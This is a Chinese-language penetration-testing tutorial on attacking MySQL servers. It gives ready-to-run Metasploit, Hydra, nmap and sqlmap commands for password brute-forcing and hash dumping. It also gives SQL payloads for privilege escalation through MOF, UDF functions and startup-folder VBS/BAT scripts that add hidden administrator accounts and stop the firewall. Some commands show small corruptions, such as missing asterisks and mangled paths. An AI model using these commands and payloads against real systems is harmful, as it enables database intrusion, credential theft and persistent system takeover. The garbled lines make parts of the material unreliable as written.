### **一、MySQL信息收集**

####  **1、端口信息收集**

Mysql默认端口是3306端口，但也有自定义端口，针对默认端口扫描主要利用扫描软件进行探测，推荐使用：

（1）nmap扫描nmap -p 3306 192.168.37.1-254

（2）iisputter，直接填写3306端口，IP地址填写单个或者C段地址。

特定目标的渗透，可能需要对全端口进行扫描，可以使用Nmap对某一个IP地址进行全端口扫描。

  

####  **2、版本信息收集**

（1）msf查看版本信息auxiliary/scanner/mysql/mysql_version模块，以扫描主机192.168.37.136为例，命令为：

use auxiliary/scanner/mysql/mysql_version

set rhosts 192.168.37.136

run
![](https://image.3001.net/images/20230511/1683795313_645cad71af9dac409b6fe.jpg!small)

能成功查询到版本说明此数据库允许外链，可进行爆破，不允许外链则挖法查询到数据库版本：![](https://image.3001.net/images/20230511/1683795331_645cad835e907ec3789a6.jpg!small)

此时，可使用nmap探测数据库版本信息，命令为：

nmap --script=mysql-info
192.168.37.136![](https://image.3001.net/images/20230511/1683795347_645cad93afb4f4185876d.jpg!small)

(2）mysql查询版本命令为：

SELECT version();

  

####  **3、数据库管理信息收集**

Mysql管理工具有多种，比如phpMyAdmin网站管理系统，Navicat for
MySQL以及MysqlFront等客户端工具。这些工具有的会直接保存配置信息，这些信息包含数据库服务器地址和数据库用户名以及密码，通过嗅探或者破解配置文件可以获取密码等信息。

  

###  **二、获取MySQL密码**

####  **1、msf爆破**

msf破解mysql密码模块auxiliary/scanner/mysql/mysql_login，以爆破主机192.168.37.136的root密码为例，命令为：

use auxiliary/scanner/mysql/mysql_login

set RHOSTS 192.168.37.136

set pass_file /root/top1000.txt

set username root

run

![](https://image.3001.net/images/20230511/1683795396_645cadc42a605d72d0bd1.jpg!small)![](https://image.3001.net/images/20230511/1683795447_645cadf7c9e2d72a13ac1.jpg!small)

爆破成功，获取到root账户密码为root。

####  **2、使用Hydra爆破**

使用Hydra可以爆破MySQL的登录账户及密码，可指定用户名或者用户名字典以及密码或者密码字典，以爆破主机192.168.37.136的root密码为例命令为：hydra
-l root -P /root/top1000.txt 192.168.37.136
mysql![](https://image.3001.net/images/20230511/1683795476_645cae14ca16634bc552c.jpg!small)![](https://image.3001.net/images/20230511/1683795489_645cae212112947206aac.jpg!small)

成功获取到root账户的密码为root。

####  **3、网页在线连接破解**

可以使用burpsuite和phpMyAdmin多线程批量破解工具。

####  **4、使用nmap扫描并破解密码**

（1）对某一个IP或者IP地址段进行nmap默认密码暴力破解并扫描

nmap --script=mysql-brute 192.168.37.136

nmap --script=mysql-brute 192.168.37.1-254

（2）使用root账号root密码进行mysql密码验证并扫描获取指定IP地址的端口信息以及mysql数据库相关信息

nmap -sV --script=mysql-databases --script-args mysql user=root,mysqlpass=root
192.168.37.136

（3）检查root空口令

nmap --script mysql-empty-password 192.168.37.136

####  **5、源代码泄露**

一些网站源代码文件中会包含数据库连接文件，通过查看这些文件可以获取数据库账号和密码。一般常见的数据库连接文件为config.php、web.config、conn.asp、db.php/asp、jdbc.properties、sysconfig.properties、JBOSS_HOME\docs\examples\jca\XXXX-ds.xml。

####  **6、文件包含**

本地文件包含漏洞可以包含文件，通过查看文件代码获取数据库配置文件，进而读取数据库用户名和密码。

  

###  **三、msf信息获取模块**

此过程进行的前提是通过前面的密码获取阶段顺利拿到数据库的密码。

####  **1、MySQL哈希值枚举**

使用auxiliary/scanner/mysql/mysql_hashdump模块枚举MySQL哈希值，命令如下：

use auxiliary/scanner/mysql/mysql_hashdump

set rhosts 192.168.37.136

set username root

set password root

run![](https://image.3001.net/images/20230511/1683795517_645cae3d9a3b913f7e39e.jpg!small)

这个模块的作用是导出在当前登陆用户权限下可以查看的账户密码hash，有点鸡肋。

####  **2、枚举数据库信息**

使用auxiliary/admin/mysql/mysql_enum模块可获取数据库版本，操作系统名称，架构，数据库目录，数据库用户以及密码哈希值，命令如下：

use auxiliary/admin/mysql/mysql_enum

set rhost 192.168.37.136

set username root

set password root

run![](https://image.3001.net/images/20230511/1683795541_645cae55920042dff64ed.jpg!small)

####  **3、执行MySQL语句**

使用auxiliary/admin/mysql/mysql_sql模块，连接成功后可以在msf执行sql语句，跟sqlmap的--sql-shell模块类似，命令如下：

use auxiliary/admin/mysql/mysql_sql

set password root

set rhost 192.168.37.136

set username root

run![](https://image.3001.net/images/20230511/1683795556_645cae6442c03572cbf05.jpg!small)

默认的sql语句为select version()，可通过命令set sql [具体命令]更改命令。

####  **4、导出mysql_schem**

使用auxiliary/scanner/mysql/mysql_schemadump模块可将mysql_schem导出到本地
/root/.msf4/loot/文件夹下，命令如下：

use auxiliary/scanner/mysql/mysql_schemadump

set rhosts 192.168.37.136

set username root

set password root

run

####  **5、文件枚举和目录可写信息枚举**

auxiliary/scanner/mysql/mysql_file_enum  
auxiliary/scanner/mysql/mysql_writable_dirs

附： **Metasploit下所有MySQL辅助、扫描以及漏洞利用模块**

auxiliary/admin/mysql/mysql_enum

MySQL枚举模块

auxiliary/admin/mysql/mysql_sql

MySQL SQL查询

auxiliary/analyze/jtr_mysql_fast

John the Ripper 破解MySQL密码

auxiliary/scanner/mysql/mysql_authbypass_hashdump

MySQL密码认证绕过

auxiliary/scanner/mysql/mysql_file_enum

MYSQL 文件/目录枚举

auxiliary/scanner/mysql/mysql_hashdump

MYSQL 密码哈希值获取

auxiliary/scanner/mysql/mysql_login

MySQL登录验证暴力破解模块

auxiliary/scanner/mysql/mysql_schemadump

MYSQL Schema 导出

auxiliary/scanner/mysql/mysql_version

MySQL信息枚举

auxiliary/scanner/mysql/mysql_writable_dirs

MYSQL目录可写测试

auxiliary/server/capture/mysql

捕获MySQL认证凭证

exploit/linux/mysql/mysql_yassl_getname

yaSSL CertDecoder::GetName溢出漏洞

exploit/linux/mysql/mysql_yassl_hello

MySQL yaSSL SSL Hello 消息溢出漏洞

exploit/windows/mysql/mysql_mof

windows mof提权

exploit/windows/mysql/mysql_payload

windows上传漏洞提权

exploit/windows/mysql/mysql_start_up

windows启动项提权

exploit/windows/mysql/mysql_yassl_hello

MySQL yaSSL SSL Hello 消息溢出exploit/windows/mysql/scrutinizer_upload_exec

Plixer Scrutinizer NetFlow和sFlow分析器9 MYSQL默认凭据上传执行

  

###  **四、MySQL提权**

####  **1、mof提权**

##### 1.1 Webshell上传mof文件提权

MySQL Root权限MOF方法提权是来自国外某位大牛发布的MySQL远程提权0day漏洞，漏洞的利用前提条件是必须具备MySQL的root权限。

##### 1.2 使用msf进行mof提权

Msf下的exploit/windows/mysql/mysql_mof模块提供了直接Mof提权，不过该漏洞成功跟操作系统权限和Mysql数据库版本有关，执行成功后会直接反弹shell到meterpreter。命令为：

use exploit/windows/mysql/mysql_mof

set rhost 192.168.37.136 //设置需要提权的远程主机IP地址

set rport 3306 //设置mysql的远程端口，默认为3306，不需要修改

set password root //设置mysql数据库root密码

set username root //设置mysql用户名run 0

####  **2、UDF提权**

UDF提权是利用MySQL的自定义函数功能，将MySQL账号转化为系统system权限，其利用条件是目标系统是Windows(Win2000,XP,Win2003)；拥有MySQL的某个用户账号，此账号必须有对MySQL的insert和delete权限以创建和抛弃函数,有root账号密码。

##### 2.1 UDF提权条件

（1）Mysql版本大于5.1版本。udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。

（2）Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\system32。

（3）掌握的mysql数据库的账号有对mysql的insert和delete权限以创建和抛弃函数，一般以root账号为佳，具备`root账号所具备的权限的其它账号也可以。

（4）拥有将udf.dll写入到相应目录的权限。

##### 2.2 提权方法

（1）获取数据库版本、数据位置以及插件位置等信息

select version();//获取数据库版本

select user();//获取数据库用户

select @@basedir ;//获取安装目录

show variables like '%plugins%'; //寻找mysql安装路径

（2）导出路径

C:\Winnt\udf.dll Windows 2000C:\Windows\udf.dll
Windows2003（有的系统被转义，需要改为C:Windowsudf.dll）

MYSQL
5.1以上版本，必须要把udf.dll文件放到MYSQL安装目录下的libplugin文件夹下才能创建自定义函数。该目录默认是不存在的，这就需要我们使用webshell找到MYSQL的安装目录，并在安装目录下创建libplugin文件夹，然后将udf.dll文件导出到该目录即可。

在某些情况下，我们会遇到Can't open shared
library的情况，这时就需要我们把udf.dll导出到lib\plugin目录下才可以，网上大牛发现利用NTFS ADS流来创建文件夹的方法：

select @@basedir; //查找到mysql的目录

select 'It is dll' into dumpfile 'C:\\\Program Files\\\MySQL\\\MySQL Server
5.1\\\lib::$INDEX_ALLOCATION'; //利用NTFS ADS创建lib目录

select 'It is dll' into dumpfile 'C:\\\Program Files\\\MySQL\\\MySQL Server
5.1\\\lib\\\plugin::$INDEX_ALLOCATION';//利用NTFS ADS创建plugin目录

执行成功以后就会plugin目录，然后再进行导出udf.dll即可。

（3）创建cmdshell 函数，该函数叫什么名字在后续中则使用该函数进行查询：

create function cmdshell returns string soname ‘lib_mysqludf_sys.dll’;

（4）执行命令：

select sys_eval(‘dir’);

连不上3389可以先停止windows防火墙和筛选

select sys_eval(‘net stop policyagent’);select sys_eval(‘net stop
sharedaccess’);

udf.dll下常见函数：

cmdshell 执行cmd;

downloader 下载者,到网上下载指定文件并保存到指定目录;

open3389 通用开3389终端服务,可指定端口(不改端口无需重启);

backshell 反弹Shell;

ProcessView 枚举系统进程;

KillProcess 终止指定进程;

regread 读注册表;

regwrite 写注册表;

shut 关机,注销,重启;

about 说明与帮助函数;

##### 2.3 webshell下udf提权

通过上传集成udf提权的webshell输入数据库用户名及密码以及数据库服务器地址或者IP通过连接后导出udf.dll进行提权。

##### 2.4 Mysql提权综合利用工具

项目地址：

https://github.com/v5est0r/Python_FuckMySQL

主要功能：

（1）自动导出你的backdoor和mof文件（2）自动判断mysql版本，根据版本不同导出UDF的DLL到不同目录，UDF提权（3）导出LPK.dll文件，劫持系统目录提权（4）写启动项提权

UdF自动提权：

python root.py -a 127.0.0.1 -p root -e "ver&whoami" -m udf

LPK劫持提权：

python root.py -a 127.0.0.1 -p root -e "ver&whoami" -m lpk

启动项提权：

python root.py -a 127.0.0.1 -p root -e "ver&whoami" –mst

##### 2.5 利用msf进行udf提权

利用msf的exploit/windows/mysql/mysql_payload模块进行udf提权，命令为：

use exploit/windows/mysql/mysql_payload

set rhost 192.168.37.136

set rport 3306

set username root

set password root

run 0

msf下udf提权成功率并不高，跟windows操作系统版本，权限和数据库版本有关，特别是secure-file-priv选项，如果有该选项基本不会成功。

####  **3、sqlmap直连数据库提权**

Sqlmap直接连接数据库提权，需要有写入权限和root账号及密码，命令如下：

（1）连接数据库；

sqlmap.py -d "mysql://root:123456@219.115.1.1:3306/mysql" --os-shell

（2）选择操作系统的架构，32位操作系统选择1，64位选择2；

（3）自动上传udf或提示os-shell；

（4）执行whomai命令如果获取系统权限，则表示提权成功。

####  **4、启动项提权**

##### 4.1 创建表并插入vbs脚本到表中

依次使用以下命令：

show databases ;

use test;

show tables;

create table a (cmd text);

insert into a values ("set wshshell=createobject (""wscript.shell"" ) " );

insert into a values ("a=wshshell.run (""cmd.exe /c net user
aspnetaspnettest/add"",0)") ;

insert into a values ("b=wshshell.run (""cmd.exe /c net localgroup
Administrators aspnet /add"",0) " );

select \ from a;

##### 4.2 导出vbs脚本到启动

使用以下命令将刚才在a表中创建的vbs脚本导出到启动选项中：

select \ from a into outfile "C:\\\Documents and Settings\\\All
Users\\\「开始」菜单\\\程序\\\启动\\\a.vbs";

导入成功后，系统重新启动时会自动添加密码为“1”且用户名称为“1”的用户到管理员组中。在实际使用过程中该脚本成功执行的几率比较低，有时候会出现不能导出的错误.

可以使用以下脚本：

show databases ;

use test;

show tables;

create table b (cmd text);

insert into b values ("net user Aspnet123545345! /add");

insert into b values ("net localgroup administrators Aspnet /add");

insert into b values ("del b.bat");

select from b into outfile "C:\\\Documents and Settings\\\All
Users\\\「开始」菜单\\\程序\\\启动\\\b.bat";

该脚本执行后虽然会闪现Dos窗口，如果有权限导入到启动选项中，则一定会执行成功，在虚拟机中通过MySQL连接器连接并执行以上命令后，在C:\Documents
and Settings\All Users\「开始」菜单\程序\启动目录中会有刚才导出的b.bat脚本文件

说明：

在不同的操作系统中C:\Documents and Settings\All
Users\「开始」菜单\程序\启动目录文件名称可能会不同，这个时候就要将其目录换成相应的目录名称即可。例如如果是英文版本操作系统则其插入的代码为：

select from b into outfile "C:\\\Documents and Settings\\\All Users\\\Start
Menu\\\Programs\\\Startup\\\b.bat";

Windows 2008 Server的启动目录为：

C:\\\ProgramData\\\Microsoft\\\Windows\\\Start
Menu\\\Programs\\\Startup\\\iis.vbs

其vbs方法可以参考如下写法：

create table a (cmd text);

insert into a values ("set wshshell=createobject (""wscript.shell"" ) " );

insert into a values ("a=wshshell.run (""cmd.exe /c net user antian365
qwer1234!@# /add"",0) " );

insert into a values ("b=wshshell.run (""cmd.exe /c net localgroup
Administrators antian365 /add"",0) " );

select \ from a into outfile "C:\\\ProgramData\\\Microsoft\\\Windows\\\Start
Menu\\\Programs\\\Startup\\\iis.vbs";

####  **5、利用msf进行启动项提权**

可以利用msf的/windows/mysql/mysql_start_up模块对MySQL进行启动项提权，命令如下：

use exploit/windows/mysql/mysql_start_up

set rhost 192.168.37.136

set rport 3306

set username root

set password root

run

msf下mysqlstartup`提权有一定的几率，对英文版系统支持较好。

####  **6、Msf其它相关漏洞提权**

##### 6.1 MySQL身份认证漏洞及利用(CVE-2012-2122)

当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。按照公告说法大约256次就能够蒙对一次。受影响的产品：
All MariaDB and MySQL versions up to 5.1.61, 5.2.11, 5.3.5, 5.5.22 存在漏洞。

MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23不存在漏洞。 MySQL versions from
5.1.63, 5.5.24, 5.6.6 are not不存在漏洞。

可以使用msf的auxiliary/scanner/mysql/mysql_authbypass_hashdump模块来利用该漏洞对MySQL进行提权，命令为：

use auxiliary/scanner/mysql/mysql_authbypass_hashdump

set rhosts 192.168.37.136

exploit

##### 6.2 MySQL消息溢出漏洞

可使用msf的exploit/windows/mysql/mysql_yassl_hello模块对该漏洞进行利用，命令为：

use exploit/windows/mysql/mysql_yassl_hello

set rhost 192.168.37.136

exploit

##### 6.3 MySQL默认凭据上传执行

使用msf的exploit/windows/mysql/scrutinizer_upload_exec模块，命令为：

use exploit/windows/mysql/scrutinizer_upload_exec

set rhost 192.168.37.136

exploit

  

